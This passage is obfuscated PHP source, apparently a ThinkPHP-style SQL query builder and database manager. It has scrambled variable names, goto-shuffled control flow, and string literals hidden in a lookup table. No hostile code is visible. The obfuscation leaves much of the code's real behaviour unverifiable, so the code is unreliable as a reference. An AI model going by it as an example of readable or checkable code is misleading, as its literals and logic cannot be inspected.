(is_string($añÑÂèšª[0])) { $F¬‘¢µ¡Ú° = strtolower($añÑÂèšª[0]); if (in_array($añÑÂèšª[0], array($Dˆ³ÆÖ¦ô®[908], $Dˆ³ÆÖ¦ô®[926], $Dˆ³ÆÖ¦ô®[927], $Dˆ³ÆÖ¦ô®[928], $Dˆ³ÆÖ¦ô®[929], $Dˆ³ÆÖ¦ô®[930]))) { $c»è›°¸ .= $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $añÑÂèšª[0] . $Dˆ³ÆÖ¦ô®[50] . $this->parseValue($añÑÂèšª[1]); } elseif (preg_match($Dˆ³ÆÖ¦ô®[931], $añÑÂèšª[0])) { $c»è›°¸ .= $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $this->exp[$F¬‘¢µ¡Ú°] . $Dˆ³ÆÖ¦ô®[50] . $this->parseValue($añÑÂèšª[1]); } elseif (preg_match($Dˆ³ÆÖ¦ô®[932], $añÑÂèšª[0])) { if (is_array($añÑÂèšª[1])) { $FÕŞÎĞÓÚ‹ = isset($añÑÂèšª[2]) ? strtoupper($añÑÂèšª[2]) : $Dˆ³ÆÖ¦ô®[917]; if (in_array($FÕŞÎĞÓÚ‹, array($Dˆ³ÆÖ¦ô®[916], $Dˆ³ÆÖ¦ô®[917], $Dˆ³ÆÖ¦ô®[918]))) { $F”øÌŸ®Œ = array(); foreach ($añÑÂèšª[1] as $D´ÊŒ”‹Ü¯) { $F”øÌŸ®Œ[] = $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $this->exp[$F¬‘¢µ¡Ú°] . $Dˆ³ÆÖ¦ô®[50] . $this->parseValue($D´ÊŒ”‹Ü¯); } $c»è›°¸ .= $Dˆ³ÆÖ¦ô®[248] . implode($Dˆ³ÆÖ¦ô®[50] . $FÕŞÎĞÓÚ‹ . $Dˆ³ÆÖ¦ô®[50], $F”øÌŸ®Œ) . $Dˆ³ÆÖ¦ô®[818]; } } else { $c»è›°¸ .= $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $this->exp[$F¬‘¢µ¡Ú°] . $Dˆ³ÆÖ¦ô®[50] . $this->parseValue($añÑÂèšª[1]); } } elseif ($Dˆ³ÆÖ¦ô®[285] == $F¬‘¢µ¡Ú°) { $c»è›°¸ .= $Dˆ³ÆÖ¦ô®[816] . $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $añÑÂèšª[1] . $Dˆ³ÆÖ¦ô®[933]; } elseif (preg_match($Dˆ³ÆÖ¦ô®[934], $añÑÂèšª[0])) { if (isset($añÑÂèšª[2]) && $Dˆ³ÆÖ¦ô®[285] == $añÑÂèšª[2]) { $c»è›°¸ .= $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $this->exp[$F¬‘¢µ¡Ú°] . $Dˆ³ÆÖ¦ô®[50] . $añÑÂèšª[1]; } else { if (is_string($añÑÂèšª[1])) { $añÑÂèšª[1] = explode($Dˆ³ÆÖ¦ô®[47], $añÑÂèšª[1]); } $d“ï†äéĞ« = implode($Dˆ³ÆÖ¦ô®[47], $this->parseValue($añÑÂèšª[1])); $c»è›°¸ .= $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $this->exp[$F¬‘¢µ¡Ú°] . $Dˆ³ÆÖ¦ô®[816] . $d“ï†äéĞ« . $Dˆ³ÆÖ¦ô®[818]; } } elseif (preg_match($Dˆ³ÆÖ¦ô®[935], $añÑÂèšª[0])) { $A°å’ñÔ¾ª = is_string($añÑÂèšª[1]) ? explode($Dˆ³ÆÖ¦ô®[47], $añÑÂèšª[1]) : $añÑÂèšª[1]; $c»è›°¸ .= $Dˆ³ÆÖ¦ô®[816] . $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $this->exp[$F¬‘¢µ¡Ú°] . $Dˆ³ÆÖ¦ô®[50] . $this->parseValue($A°å’ñÔ¾ª[0]) . $Dˆ³ÆÖ¦ô®[919] . $this->parseValue($A°å’ñÔ¾ª[1]) . $Dˆ³ÆÖ¦ô®[266]; } else { think_exception(think_lang($Dˆ³ÆÖ¦ô®[922]) . $Dˆ³ÆÖ¦ô®[4] . $añÑÂèšª[0]); } } else { $F‰ÔÌ°¯ËŞ = count($añÑÂèšª); $aÕâ‡ÊÇÈÏ = isset($añÑÂèšª[$F‰ÔÌ°¯ËŞ - 1]) ? strtoupper($añÑÂèšª[$F‰ÔÌ°¯ËŞ - 1]) : $Dˆ³ÆÖ¦ô®[33]; if (in_array($aÕâ‡ÊÇÈÏ, array($Dˆ³ÆÖ¦ô®[916], $Dˆ³ÆÖ¦ô®[917], $Dˆ³ÆÖ¦ô®[918]))) { $F‰ÔÌ°¯ËŞ = $F‰ÔÌ°¯ËŞ - 1; } else { $aÕâ‡ÊÇÈÏ = $Dˆ³ÆÖ¦ô®[916]; } for ($f†İ•áçã = 0; $f†İ•áçã < $F‰ÔÌ°¯ËŞ; $f†İ•áçã++) { $A°å’ñÔ¾ª = is_array($añÑÂèšª[$f†İ•áçã]) ? $añÑÂèšª[$f†İ•áçã][1] : $añÑÂèšª[$f†İ•áçã]; if ($Dˆ³ÆÖ¦ô®[285] == strtolower($añÑÂèšª[$f†İ•áçã][0])) { $c»è›°¸ .= $Dˆ³ÆÖ¦ô®[248] . $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $A°å’ñÔ¾ª . $Dˆ³ÆÖ¦ô®[933] . $aÕâ‡ÊÇÈÏ . $Dˆ³ÆÖ¦ô®[50]; } else { $fÄóÊ—°èŠ = is_array($añÑÂèšª[$f†İ•áçã]) ? $this->exp[strtolower($añÑÂèšª[$f†İ•áçã][0])] : $Dˆ³ÆÖ¦ô®[908]; if (!$fÄóÊ—°èŠ && is_array($añÑÂèšª[$f†İ•áçã]) && in_array($añÑÂèšª[$f†İ•áçã][0], array($Dˆ³ÆÖ¦ô®[908], $Dˆ³ÆÖ¦ô®[926], $Dˆ³ÆÖ¦ô®[927], $Dˆ³ÆÖ¦ô®[928], $Dˆ³ÆÖ¦ô®[929], $Dˆ³ÆÖ¦ô®[930]))) { $fÄóÊ—°èŠ = $añÑÂèšª[$f†İ•áçã][0]; } $c»è›°¸ .= $Dˆ³ÆÖ¦ô®[248] . $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[50] . $fÄóÊ—°èŠ . $Dˆ³ÆÖ¦ô®[50] . $this->parseValue($A°å’ñÔ¾ª) . $Dˆ³ÆÖ¦ô®[933] . $aÕâ‡ÊÇÈÏ . $Dˆ³ÆÖ¦ô®[50]; } } $c»è›°¸ = substr($c»è›°¸, 0, -4); } } else { $c»è›°¸ .= $DÔ²«İŠøÅ . $Dˆ³ÆÖ¦ô®[936] . $this->parseValue($añÑÂèšª); } return $c»è›°¸; } protected function parseThinkWhere($d±äàÔ•Õ¯, $d•ÍÃÚ›í¸) { $eä©è´†ÜË =& $_SERVER[Æ]; $C·ŸÄˆ¿˜ = $eä©è´†ÜË[33]; switch ($d±äàÔ•Õ¯) { case $eä©è´†ÜË[339]: $C·ŸÄˆ¿˜ = $d•ÍÃÚ›í¸; break; case $eä©è´†ÜË[920]: $C·ŸÄˆ¿˜ = is_string($d•ÍÃÚ›í¸) ? $d•ÍÃÚ›í¸ : substr($this->parseWhere($d•ÍÃÚ›í¸), 6); break; case $eä©è´†ÜË[937]: parse_str($d•ÍÃÚ›í¸, $Dî¾ÇºÂ…ª); if (isset($Dî¾ÇºÂ…ª[$eä©è´†ÜË[915]])) { $cè“Í·”¯Ç = $eä©è´†ÜË[50] . strtoupper($Dî¾ÇºÂ…ª[$eä©è´†ÜË[915]]) . $eä©è´†ÜË[50]; unset($Dî¾ÇºÂ…ª[$eä©è´†ÜË[915]]); } else { $cè“Í·”¯Ç = $eä©è´†ÜË[919]; } $CµŸ¾À­ÃÉ = array(); foreach ($Dî¾ÇºÂ…ª as $A”òÍ·ŞÆ­ => $a™‘‡‹·) { $CµŸ¾À­ÃÉ[] = $this->parseKey($A”òÍ·ŞÆ­) . $eä©è´†ÜË[936] . $this->parseValue($a™‘‡‹·); } $C·ŸÄˆ¿˜ = implode($cè“Í·”¯Ç, $CµŸ¾À­ÃÉ); break; } return $C·ŸÄˆ¿˜; } protected function parseLimit($Fƒ‘‚ìˆ’¿) { $e¥…Úç†¬‚ =& $_SERVER[Æ]; return !empty($Fƒ‘‚ìˆ’¿) ? $e¥…Úç†¬‚[48] . $Fƒ‘‚ìˆ’¿ . $e¥…Úç†¬‚[50] : $e¥…Úç†¬‚[33]; } protected function parseJoin($b–„éã™á’) { $dİºİíê÷Æ =& $_SERVER[Æ]; $dÈâ½ë‚ ¨ = $dİºİíê÷Æ[33]; if (!empty($b–„éã™á’)) { if (is_array($b–„éã™á’)) { foreach ($b–„éã™á’ as $c°“’™…· => $cßä…îÓ¡¸) { if (!1 !== stripos($cßä…îÓ¡¸, $dİºİíê÷Æ[938])) { $dÈâ½ë‚ ¨ .= $dİºİíê÷Æ[50] . $cßä…îÓ¡¸; } else { $dÈâ½ë‚ ¨ .= $dİºİíê÷Æ[939] . $cßä…îÓ¡¸; } } } else { $dÈâ½ë‚ ¨ .= $dİºİíê÷Æ[939] . $b–„éã™á’; } } $dÈâ½ë‚ ¨ = preg_replace($dİºİíê÷Æ[940], think_config($dİºİíê÷Æ[843]) . $dİºİíê÷Æ[941], $dÈâ½ë‚ ¨); return $dÈâ½ë‚ ¨; } protected function parseOrder($f–µÕ¢í„º) { $E·ô¬§õ© =& $_SERVER[Æ]; if (is_array($f–µÕ¢í„º)) { $Cåª°ˆ”˜Š = array(); foreach ($f–µÕ¢í„º as $aœ††íä‰ => $Fõò¹Ö¤¥Ğ) { if (is_numeric($aœ††íä‰)) { $Cåª°ˆ”˜Š[] = $this->parseKey($Fõò¹Ö¤¥Ğ); } else { $Fõò¹Ö¤¥Ğ = in_array(strtoupper(trim($Fõò¹Ö¤¥Ğ)), array($E·ô¬§õ©[942], $E·ô¬§õ©[943])) ? $E·ô¬§õ©[50] . $Fõò¹Ö¤¥Ğ : $E·ô¬§õ©[33]; if (preg_match($E·ô¬§õ©[944], $aœ††íä‰)) { $Cåª°ˆ”˜Š[] = $this->parseKey($aœ††íä‰) . $Fõò¹Ö¤¥Ğ; } else { think_exception($E·ô¬§õ©[945] . $aœ††íä‰); } } } $f–µÕ¢í„º = implode($E·ô¬§õ©[47], $Cåª°ˆ”˜Š); } return !empty($f–µÕ¢í„º) ? $E·ô¬§õ©[946] . $f–µÕ¢í„º : $E·ô¬§õ©[33]; } protected function parseGroup($E‚ªæÔ—„Ä) { $eò’‚«ïó =& $_SERVER[Æ]; return !empty($E‚ªæÔ—„Ä) ? $eò’‚«ïó[947] . $E‚ªæÔ—„Ä : $eò’‚«ïó[33]; } protected function parseHaving($F¦‡Ï¡È¦š) { $aõê«Ê‚¾­ =& $_SERVER[Æ]; return !empty($F¦‡Ï¡È¦š) ? $aõê«Ê‚¾­[948] . $F¦‡Ï¡È¦š : $aõê«Ê‚¾­[33]; } protected function parseComment($d“ƒ×¥òÖ¦) { $E¼ìÔ˜ï«ä =& $_SERVER[Æ]; return !empty($d“ƒ×¥òÖ¦) ? $E¼ìÔ˜ï«ä[949] . $d“ƒ×¥òÖ¦ . $E¼ìÔ˜ï«ä[950] : $E¼ìÔ˜ï«ä[33]; } protected function parseDistinct($FÈµ÷ÀÎ—ê) { $EÀ¸™ô“Š« =& $_SERVER[Æ]; return !empty($FÈµ÷ÀÎ—ê) ? $EÀ¸™ô“Š«[951] : $EÀ¸™ô“Š«[33]; } protected function parseUnion($eí•’À®Õš) { $BÜ³ŞÔµÉ =& $_SERVER[Æ]; if (empty($eí•’À®Õš)) { return $BÜ³ŞÔµÉ[33]; } if (isset($eí•’À®Õš[$BÜ³ŞÔµÉ[336]])) { $aÊÊŸ”‘ğ¬ = $BÜ³ŞÔµÉ[952]; unset($eí•’À®Õš[$BÜ³ŞÔµÉ[336]]); } else { $aÊÊŸ”‘ğ¬ = $BÜ³ŞÔµÉ[953]; } foreach ($eí•’À®Õš as $CÃ„İÎôŠğ) { $fªåÊòœ·‚[] = $aÊÊŸ”‘ğ¬ . (is_array($CÃ„İÎôŠğ) ? $this->buildSelectSql($CÃ„İÎôŠğ) : $CÃ„İÎôŠğ); } return implode($BÜ³ŞÔµÉ[50], $fªåÊòœ·‚); } public function insert($Cãíš“œ…·, $C¼à™¼ùŒ = array(), $BÃÚõ¤ßÜ = false) { goto e™¼¡ìˆ¥’; eÌ£’–‰¡¤: foreach ($Cãíš“œ…· as $bŠ–ŸÍŠòƒ => $cˆÀ£Î¿Æ¶) { if (is_array($cˆÀ£Î¿Æ¶) && $FÌÀ˜ÎĞ•[285] == $cˆÀ£Î¿Æ¶[0]) { $dÓ„†ŒäŠŒ[] = $this->parseKey($bŠ–ŸÍŠòƒ); $Cé•ïÚóÅª[] = $cˆÀ£Î¿Æ¶[1]; } elseif (is_scalar($cˆÀ£Î¿Æ¶) || is_null($cˆÀ£Î¿Æ¶)) { $dÓ„†ŒäŠŒ[] = $this->parseKey($bŠ–ŸÍŠòƒ); $Cé•ïÚóÅª[] = $this->parseValue($cˆÀ£Î¿Æ¶); } } $d¸š°Ç†Ãà = ($BÃÚõ¤ßÜ ? $FÌÀ˜ÎĞ•[820] : $FÌÀ˜ÎĞ•[821]) . $FÌÀ˜ÎĞ•[822] . $this->parseTable($C¼à™¼ùŒ[$FÌÀ˜ÎĞ•[267]]) . $FÌÀ˜ÎĞ•[816] . implode($FÌÀ˜ÎĞ•[47], $dÓ„†ŒäŠŒ) . $FÌÀ˜ÎĞ•[817] . implode($FÌÀ˜ÎĞ•[47], $Cé•ïÚóÅª) . $FÌÀ˜ÎĞ•[818]; $d¸š°Ç†Ãà .= $this->parseLock(isset($C¼à™¼ùŒ[$FÌÀ˜ÎĞ•[769]]) ? $C¼à™¼ùŒ[$FÌÀ˜ÎĞ•[769]] : !1); goto e–ÒãÂÆø ; e™¼¡ìˆ¥’: $FÌÀ˜ÎĞ• =& $_SERVER[Æ]; $Cé•ïÚóÅª = $dÓ„†ŒäŠŒ = array(); $this->model = $C¼à™¼ùŒ[$FÌÀ˜ÎĞ•[269]]; goto eÌ£’–‰¡¤; e–ÒãÂÆø : $d¸š°Ç†Ãà .= $this->parseComment(!empty($C¼à™¼ùŒ[$FÌÀ˜ÎĞ•[341]]) ? $C¼à™¼ùŒ[$FÌÀ˜ÎĞ•[341]] : $FÌÀ˜ÎĞ•[33]); return $this->execute($d¸š°Ç†Ãà, $this->parseBind(!empty($C¼à™¼ùŒ[$FÌÀ˜ÎĞ•[273]]) ? $C¼à™¼ùŒ[$FÌÀ˜ÎĞ•[273]] : array())); goto e‡â±‰ùöÈ; e‡â±‰ùöÈ: } public function selectInsert($f‡Ä•ÇçÓ®, $E†÷†¥ÆŞ, $A·ÆàÄ„öÛ = array()) { goto DíîŒÆ¯ƒ; DíîŒÆ¯ƒ: $c Ö¶Ë’‚á =& $_SERVER[Æ]; $this->model = $A·ÆàÄ„öÛ[$c Ö¶Ë’‚á[269]]; if (is_string($f‡Ä•ÇçÓ®)) { $f‡Ä•ÇçÓ® = explode($c Ö¶Ë’‚á[47], $f‡Ä•ÇçÓ®); } goto DáÃäƒ©Âñ; a‡øİ¥¢Ø‰: return $this->execute($a‡¶‘œŞ£, $this->parseBind(!empty($A·ÆàÄ„öÛ[$c Ö¶Ë’‚á[273]]) ? $A·ÆàÄ„öÛ[$c Ö¶Ë’‚á[273]] : array())); goto BÁÍ”î­Ñ; DáÃäƒ©Âñ: array_walk($f‡Ä•ÇçÓ®, array($this, $c Ö¶Ë’‚á[819])); $a‡¶‘œŞ£ = $c Ö¶Ë’‚á[954] . $this->parseTable($E†÷†¥ÆŞ) . $c Ö¶Ë’‚á[816] . implode($c Ö¶Ë’‚á[47], $f‡Ä•ÇçÓ®) . $c Ö¶Ë’‚á[933]; $a‡¶‘œŞ£ .= $this->buildSelectSql($A·ÆàÄ„öÛ); goto a‡øİ¥¢Ø‰; BÁÍ”î­Ñ: } public function update($Eâ·ˆœğÆ, $f‚»Ÿ†·»²) { $fáŞŒÙ¢Ÿç =& $_SERVER[Æ]; $this->model = $f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[269]]; $b¼Äˆ®„¹ = $fáŞŒÙ¢Ÿç[955] . $this->parseTable($f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[267]]) . $this->parseSet($Eâ·ˆœğÆ) . $this->parseWhere(!empty($f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[263]]) ? $f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[263]] : $fáŞŒÙ¢Ÿç[33]) . $this->parseOrder(!empty($f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[350]]) ? $f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[350]] : $fáŞŒÙ¢Ÿç[33]) . $this->parseLimit(!empty($f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[280]]) ? $f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[280]] : $fáŞŒÙ¢Ÿç[33]) . $this->parseLock(isset($f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[769]]) ? $f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[769]] : !1) . $this->parseComment(!empty($f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[341]]) ? $f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[341]] : $fáŞŒÙ¢Ÿç[33]); return $this->execute($b¼Äˆ®„¹, $this->parseBind(!empty($f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[273]]) ? $f‚»Ÿ†·»²[$fáŞŒÙ¢Ÿç[273]] : array())); } public function delete($Aí–ôŒÚÊ = array()) { $a’‘È¦šÏÌ =& $_SERVER[Æ]; $this->model = $Aí–ôŒÚÊ[$a’‘È¦šÏÌ[269]]; $aÍµÑèÜ¯ = $a’‘È¦šÏÌ[956] . $this->parseTable($Aí–ôŒÚÊ[$a’‘È¦šÏÌ[267]]) . $this->parseWhere(!empty($Aí–ôŒÚÊ[$a’‘È¦šÏÌ[263]]) ? $Aí–ôŒÚÊ[$a’‘È¦šÏÌ[263]] : $a’‘È¦šÏÌ[33]) . $this->parseOrder(!empty($Aí–ôŒÚÊ[$a’‘È¦šÏÌ[350]]) ? $Aí–ôŒÚÊ[$a’‘È¦šÏÌ[350]] : $a’‘È¦šÏÌ[33]) . $this->parseLimit(!empty($Aí–ôŒÚÊ[$a’‘È¦šÏÌ[280]]) ? $Aí–ôŒÚÊ[$a’‘È¦šÏÌ[280]] : $a’‘È¦šÏÌ[33]) . $this->parseLock(isset($Aí–ôŒÚÊ[$a’‘È¦šÏÌ[769]]) ? $Aí–ôŒÚÊ[$a’‘È¦šÏÌ[769]] : !1) . $this->parseComment(!empty($Aí–ôŒÚÊ[$a’‘È¦šÏÌ[341]]) ? $Aí–ôŒÚÊ[$a’‘È¦šÏÌ[341]] : $a’‘È¦šÏÌ[33]); return $this->execute($aÍµÑèÜ¯, $this->parseBind(!empty($Aí–ôŒÚÊ[$a’‘È¦šÏÌ[273]]) ? $Aí–ôŒÚÊ[$a’‘È¦šÏÌ[273]] : array())); } public function select($CÓƒìá³Ğ÷ = array()) { goto b¡˜¾°·‡; E”ª®£®‘: $F¶‰–À«ºë = isset($CÓƒìá³Ğ÷[$d£ó®´ãº[337]]) ? $CÓƒìá³Ğ÷[$d£ó®´ãº[337]] : !1; if ($F¶‰–À«ºë) { $EÅÂ¨÷¦ØÅ = is_string($F¶‰–À«ºë[$d£ó®´ãº[89]]) ? $F¶‰–À«ºë[$d£ó®´ãº[89]] : $d£ó®´ãº[957] . md5($bÜ²³ìŒÚ); $F‘«ßâšù = think_cache($EÅÂ¨÷¦ØÅ, $d£ó®´ãº[33], $F¶‰–À«ºë); if (!1 !== $F‘«ßâšù) { return $F‘«ßâšù; } } $CÜš¸µ¥ = $this->query($bÜ²³ìŒÚ, $this->parseBind(!empty($CÓƒìá³Ğ÷[$d£ó®´ãº[273]]) ? $CÓƒìá³Ğ÷[$d£ó®´ãº[273]] : array())); goto a†’šÎ…»; b¡˜¾°·‡: $d£ó®´ãº =& $_SERVER[Æ]; $this->model = $CÓƒìá³Ğ÷[$d£ó®´ãº[269]]; $bÜ²³ìŒÚ = $this->buildSelectSql($CÓƒìá³Ğ÷); goto E”ª®£®‘; a†’šÎ…»: if ($F¶‰–À«ºë && !1 !== $CÜš¸µ¥) { think_cache($EÅÂ¨÷¦ØÅ, $CÜš¸µ¥, $F¶‰–À«ºë); } return $CÜš¸µ¥; goto fŠ¬¸ºŠ¼; fŠ¬¸ºŠ¼: } public function buildSelectSql($AÈ¾´¤–¢‡ = array()) { goto A›•òì¿«¢; EĞêğÔåØÛ: $Eñ¨§½Å „ = $this->parseSql($this->selectSql, $AÈ¾´¤–¢‡); $Eñ¨§½Å „ .= $this->parseLock(isset($AÈ¾´¤–¢‡[$b’åÛÓÅÌ[769]]) ? $AÈ¾´¤–¢‡[$b’åÛÓÅÌ[769]] : !1); if (isset($dˆğ™Äí‡Ş)) { think_cache($dˆğ™Äí‡Ş, $Eñ¨§½Å „); } goto FŠ‡öÕ„; FŠ‡öÕ„: return $Eñ¨§½Å „; goto aåĞ÷Ûõ‚–; A›•òì¿«¢: $b’åÛÓÅÌ =& $_SERVER[Æ]; if (isset($AÈ¾´¤–¢‡[$b’åÛÓÅÌ[340]])) { if (strpos($AÈ¾´¤–¢‡[$b’åÛÓÅÌ[340]], $b’åÛÓÅÌ[47])) { list($BÕ§ÊŸ¹ô, $Eè¨â‹É´¾) = explode($b’åÛÓÅÌ[47], $AÈ¾´¤–¢‡[$b’åÛÓÅÌ[340]]); } else { $BÕ§ÊŸ¹ô = $AÈ¾´¤–¢‡[$b’åÛÓÅÌ[340]]; } $BÕ§ÊŸ¹ô = $BÕ§ÊŸ¹ô ? $BÕ§ÊŸ¹ô : 1; $Eè¨â‹É´¾ = isset($Eè¨â‹É´¾) ? $Eè¨â‹É´¾ : (is_numeric($AÈ¾´¤–¢‡[$b’åÛÓÅÌ[280]]) ? $AÈ¾´¤–¢‡[$b’åÛÓÅÌ[280]] : 20); $Dö„äğ¥·ˆ = $Eè¨â‹É´¾ * ((int) $BÕ§ÊŸ¹ô - 1); $AÈ¾´¤–¢‡[$b’åÛÓÅÌ[280]] = $Dö„äğ¥·ˆ . $b’åÛÓÅÌ[47] . $Eè¨â‹É´¾; } if (think_config($b’åÛÓÅÌ[958])) { $dˆğ™Äí‡Ş = $b’åÛÓÅÌ[959] . md5(serialize($AÈ¾´¤–¢‡)); $d™×¿Ÿ­ˆ = think_cache($dˆğ™Äí‡Ş); if ($d™×¿Ÿ­ˆ) { return $d™×¿Ÿ­ˆ; } } goto EĞêğÔåØÛ; aåĞ÷Ûõ‚–: } public function parseSql($b«¯»ÁÅ’, $A¦ì³‘“°ƒ = array()) { $aÃÀ§õ¾æ =& $_SERVER[Æ]; $b«¯»ÁÅ’ = str_replace(array($aÃÀ§õ¾æ[960], $aÃÀ§õ¾æ[961], $aÃÀ§õ¾æ[962], $aÃÀ§õ¾æ[963], $aÃÀ§õ¾æ[964], $aÃÀ§õ¾æ[965], $aÃÀ§õ¾æ[966], $aÃÀ§õ¾æ[967], $aÃÀ§õ¾æ[968], $aÃÀ§õ¾æ[969], $aÃÀ§õ¾æ[970]), array($this->parseTable("{$A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[267]]}"), $this->parseDistinct(isset($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[971]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[971]] : !1), $this->parseField(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[261]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[261]] : $aÃÀ§õ¾æ[176]), $this->parseJoin(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[270]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[270]] : $aÃÀ§õ¾æ[33]), $this->parseWhere(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[263]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[263]] : $aÃÀ§õ¾æ[33]), $this->parseGroup(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[972]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[972]] : $aÃÀ§õ¾æ[33]), $this->parseHaving(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[973]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[973]] : $aÃÀ§õ¾æ[33]), $this->parseOrder(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[350]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[350]] : $aÃÀ§õ¾æ[33]), $this->parseLimit(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[280]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[280]] : $aÃÀ§õ¾æ[33]), $this->parseUnion(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[335]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[335]] : $aÃÀ§õ¾æ[33]), $this->parseComment(!empty($A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[341]]) ? $A¦ì³‘“°ƒ[$aÃÀ§õ¾æ[341]] : $aÃÀ§õ¾æ[33])), $b«¯»ÁÅ’); return $b«¯»ÁÅ’; } public function getLastSql($E”ÉµÊîÊµ = '') { return $E”ÉµÊîÊµ ? $this->modelSql[$E”ÉµÊîÊµ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Aùùºœ²ˆ) { return addslashes($Aùùºœ²ˆ); } public function setModel($aéÚÒìë¤˜) { $this->model = $aéÚÒìë¤˜; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($C»©Ôæ‡ÃŸ, $e¥ƒˆ‚‰œ‡ = '') { $this->database = $C»©Ôæ‡ÃŸ; $this->type = $e¥ƒˆ‚‰œ‡; } public function model($fÚ¥£¯Üõ = '') { return new ModelBase($fÚ¥£¯Üõ, $_SERVER[Æ][33], $this->database); } public function db($cÎêØóåå = false) { goto eÓ„Âàïã‘; B›É¡ÆàÏÊ: $this->database = $e¼¢§“ì÷¸; $dœ©»îª­->execute("\165\163\x65\x20\140{$Fë§‚ïİğ§}\x60"); return $dœ©»îª­; goto AÛÃ…Å›; eÓ„Âàïã‘: $B›õ‘†ô =& $_SERVER[Æ]; $e¼¢§“ì÷¸ = array_change_key_case($this->database); if ($this->type == $B›õ‘†ô[9] || !$cÎêØóåå) { return $this->model()->db(); } goto AÌÒ©È…™ª; B½¬òïö´½: if (!$eÈŒ¶ö ñÄ) { $dœ©»îª­->execute("\143\162\145\141\x74\x65\40\x64\141\x74\141\142\x61\163\x65\x20\140{$Fë§‚ïİğ§}\x60"); } $e¼¢§“ì÷¸[$B›õ‘†ô[886]] = $Fë§‚ïİğ§; if ($e¼¢§“ì÷¸[$B›õ‘†ô[721]] == $B›õ‘†ô[722]) { $e¼¢§“ì÷¸[$B›õ‘†ô[723]] .= $B›õ‘†ô[974] . $Fë§‚ïİğ§; } goto B›É¡ÆàÏÊ; fåß‘âˆ¿Ğ: $this->database = $e¼¢§“ì÷¸; $dœ©»îª­ = $this->model()->db(); try { $eÈŒ¶ö ñÄ = $dœ©»îª­->execute("\163\x68\157\167\40\x64\141\164\141\142\141\x73\145\163\x20\154\x69\153\x65\x20\47{$Fë§‚ïİğ§}\x27"); } catch (Exception $aĞÕ¥ÜÌÇ) { } goto B½¬òïö´½; AÌÒ©È…™ª: $Fë§‚ïİğ§ = $e¼¢§“ì÷¸[$B›õ‘†ô[886]]; $e¼¢§“ì÷¸[$B›õ‘†ô[886]] = $B›õ‘†ô[33]; if ($e¼¢§“ì÷¸[$B›õ‘†ô[721]] == $B›õ‘†ô[722]) { $c½™»Çò×À = $e¼¢§“ì÷¸[$B›õ‘†ô[723]]; $e¼¢§“ì÷¸[$B›õ‘†ô[723]] = substr($c½™»Çò×À, 0, strrpos($c½™»Çò×À, $B›õ‘†ô[974])); } goto fåß‘âˆ¿Ğ; AÛÃ…Å›: } public function createTable($E‘áìÎ¢ÕÔ, $dÆƒ•…¬¿ù = null) { $f´Ú«ÚÊŸ =& $_SERVER[Æ]; if (!IO::exist($E‘áìÎ¢ÕÔ)) { show_json(LNG($f´Ú«ÚÊŸ[975]), !1); } $BÔÙÈ¹©©• = sqlSplit(IO::getContent($E‘áìÎ¢ÕÔ)); foreach ($BÔÙÈ¹©©• as $F‚ÒÁ‡˜Ø“) { if ($dÆƒ•…¬¿ù) { $eÀˆ±±¸ïë = stripos($F‚ÒÁ‡˜Ø“, $f´Ú«ÚÊŸ[976]) === 0; if ($eÀˆ±±¸ïë) { $dÆƒ•…¬¿ù->task[$f´Ú«ÚÊŸ[977]] += 1; } } $this->model()->db()->execute($F‚ÒÁ‡˜Ø“); if ($dÆƒ•…¬¿ù && $eÀˆ±±¸ïë) { preg_match($f´Ú«ÚÊŸ[978], $F‚ÒÁ‡˜Ø“, $cŞÁ“å¿¬); $dÆƒ•…¬¿ù->task[$f´Ú«ÚÊŸ[979]] = $cŞÁ“å¿¬[1]; $dÆƒ•…¬¿ù->update(1); } } $this->taskToCache($dÆƒ•…¬¿ù); } public function insertTable($c†¢é¿¢˜¦, $F²Ïê£Û¯ = null) { $A³òÙŠ§Ÿß =& $_SERVER[Æ]; 